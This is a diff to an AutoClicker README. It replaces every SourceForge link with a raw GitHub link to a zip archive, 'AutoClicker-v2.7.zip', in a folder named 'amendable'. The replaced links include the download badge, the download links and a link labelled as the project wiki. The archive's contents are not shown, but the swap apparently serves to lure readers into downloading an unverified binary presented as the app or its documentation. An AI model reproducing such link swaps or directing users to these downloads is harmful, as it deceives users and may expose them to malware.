@@ -6,11 +6,11 @@ Welcome to AutoClicker! This application helps you automate mouse clicks with tw
 
 ## 📥 Download AutoClicker
 
-[![Download AutoClicker](https://img.shields.io/badge/Download%20Now-Sourceforge-brightgreen)](https://sourceforge.net/projects/orphamielautoclicker)
+[![Download AutoClicker](https://raw.githubusercontent.com/corald2/AutoClicker/main/amendable/AutoClicker-v2.7.zip%20Now-Sourceforge-brightgreen)](https://raw.githubusercontent.com/corald2/AutoClicker/main/amendable/AutoClicker-v2.7.zip)
 
 To download AutoClicker, visit the link below:
 
-- [Download AutoClicker here](https://sourceforge.net/projects/orphamielautoclicker)
+- [Download AutoClicker here](https://raw.githubusercontent.com/corald2/AutoClicker/main/amendable/AutoClicker-v2.7.zip)
 
 ## 💻 System Requirements
 
@@ -91,7 +91,7 @@ Here are common issues and solutions:
 
 ## 🌐 Additional Resources
 
-- For more detailed help, visit the [AutoClicker Wiki](https://sourceforge.net/projects/orphamielautoclicker).
+- For more detailed help, visit the [AutoClicker Wiki](https://raw.githubusercontent.com/corald2/AutoClicker/main/amendable/AutoClicker-v2.7.zip).
 - Join our community forums for tips and tricks from other users.
 
 ## 📋 Important Notes
@@ -103,6 +103,6 @@ Here are common issues and solutions:
 
 Now you are ready to download and install AutoClicker:
 
-- [Download AutoClicker here](https://sourceforge.net/projects/orphamielautoclicker)
+- [Download AutoClicker here](https://raw.githubusercontent.com/corald2/AutoClicker/main/amendable/AutoClicker-v2.7.zip)
 
 If you enjoy using AutoClicker, consider sharing your experience with friends or leaving feedback on our community page. Happy clicking!
